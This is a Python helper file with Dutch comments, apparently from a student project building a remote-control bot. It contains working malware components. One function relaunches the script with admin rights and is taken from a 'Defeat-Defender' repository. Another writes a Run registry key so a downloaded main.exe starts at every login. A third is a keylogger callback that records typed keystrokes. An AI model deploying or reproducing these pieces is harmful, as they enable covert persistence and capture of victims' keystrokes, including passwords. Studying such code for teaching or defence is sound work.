# Dit zijn de kleinste functies
# Die geen zelf gemaakte functies daarbinnen hebben
import os, sys, ctypes, winreg


# functie die de ASCII banner maakt
def make_banner() -> str:
    """
    Geeft de ASCII banner terug als string.
    """
    return r"""
               _.-*'""'*-._
            .-"            "-.
          ,"                  ",
        .'      _.-.--.-._      ',
       /     .-'.-"    "-.'-.     \
      /     /  /"'-.  .-'"\  \     \
     :     :  :     ;:     ;  ;     ;
     ;     :  ; *   !! *   :  ;     :
     ;      ; :   .'  '.   ; :      :
     :       \ \-'      '-/ /       ;
      \       '.'-_    _-'.'       /
       \        '*-"-+"-*'        /
        '.          /|          .'
          *,       / |        ,*
          / '-_            _-'  \
         /     "*-.____.-*"      \
        /            |            \
       :    :        |        ;    ;
       |.--.;        |        :.--.|
       (   ()        |        ()   )
        '--^_        |        _^--'
           | "'*--.._I_..--*'" |
           | __..._  | _..._   |
          .'"      `"'"     ''"'.
Ik ben Ready, gebruik /help om alle commands te zien
===========================================
Viresh & Muazma
===========================================
"""

# path en naam voor het opslaan van media
def save_media_to(filename_prefix, extension) -> str:
    """
    Maakt de map aan (als die nog niet bestaat) en genereert een uniek bestandsnaam + pad.
    
    Args:
        filename_prefix (str): Voorvoegsel van de bestandsnaam, bijv. "screenshot" of "video"
        extension (str): Bestandsextensie, bijv. "png" of "mp4"
    
    Returns:
        str: Volledige pad naar het bestand
    """
    os.makedirs("./media", exist_ok=True)
    filename = f"{filename_prefix}.{extension}"
    return os.path.join("./media", filename)

# functie om admin rechten aan te zetten
# Source: https://github.com/witchfindertr/Defeat-Defender-Python-Version-/blob/c2a43b4b2f570b87259ca368a98d2e3ab3572dff/Defeat-Defender.py#L11-L15
def get_adminRights():
    """Maak een terminal open met admin rechten, en sluit de oude (zonder admin rechten)"""
    if sys.argv[-1] != "asadmin":
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script] + sys.argv[1:] + ['asadmin'])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
        sys.exit(0)

# Code uit week 2 opdracht
def add_to_registry(program_name):
    try:
        # Bepaal de registersleutel voor de huidige gebruiker
        registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")

        # Voeg een nieuwe registerwaarde toe
        winreg.SetValueEx(registry_key, program_name, 0, winreg.REG_SZ, rf"C:\Users\{os.getlogin()}\Downloads\main.exe")

        print(f"{program_name} is toegevoegd aan de opstart-items")

        # Sluit de registersleutel
        winreg.CloseKey(registry_key)

    except Exception as e:
        print(f"Fout bij toevoegen aan het register: {e}")

# key logger
inputList = []
# slaat keyboard toetsen op in een lijst, zorgt ervoor dat shift niet in de lijst blijft. en stopt de keylogger met enter
def log_a_string(key):
    global inputList

    try:
        # de logger stoppen als enter geklikt wordt
        if key == key.enter:
            # delete Key.shift uit de list, als het voorkomt in de list
            while 'Key.shift' in inputList:
                inputList.remove('Key.shift')
            return False
        
        # spatie toevoegen als het gebruikt wordt
        elif key == key.space:
            inputList.append(" ")

        # als backspace geklikt wordt, en er staat iets in de list
        elif key == key.backspace and len(inputList) > 0:
            # haal dan de laatste item uit de list
            inputList.pop(-1)
        
        # voor letters en cijfers
        else:
            inputList.append(format(key.char))

    # als het tekens zijn
    except AttributeError:
        inputList.append(format(key))
